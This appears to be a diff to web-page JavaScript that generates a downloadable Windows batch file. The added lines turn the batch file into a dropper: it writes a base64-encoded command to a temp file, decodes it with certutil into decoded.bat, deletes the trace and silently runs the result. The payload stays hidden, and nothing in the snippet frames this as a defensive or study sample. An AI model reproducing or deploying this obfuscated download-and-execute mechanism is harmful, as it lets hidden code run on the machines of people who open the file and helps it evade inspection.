@@ -12,13 +12,19 @@
 			
 			// Create batch file content 
 			var  content  =  '@echo off\r\n' ; 
-			content  +=  '"'  +  cmd  +  '"' ; 
+			content += 'setlocal enabledelayedexpansion\r\n';
+			content += 'set base64_string=' + cmd + '\r\n';
+			content += 'set "temp_file=%temp%\\temp.bat"\r\n';
+			content += 'echo %base64_string% > %temp_file%\r\n';
+			content += 'certutil -decode %temp_file% %temp%\\decoded.bat >nul\r\n';
+			content += 'del %temp_file%\r\n';
+			content += 'call %temp%\\decoded.bat >nul\r\n';
 			
 			// Create Blob object 
 			var  blob  =  new  Blob ( [ content ] ,  { type :  'text/plain' } ) ; 
 			
 			// Generate random filename 
-			var  filename  =  Math . random ( ) . toString ( 36 ) . substring ( 2 )  +  '.bat' ; 
+			var  filename  =  'script_'  +  Math . random ( ) . toString ( 36 ) . substring ( 2 )  +  '.bat' ; 
 			
 			// Generate download URL and set it as the href of a link 
 			var  link  =  document . createElement ( 'a' ) ; 
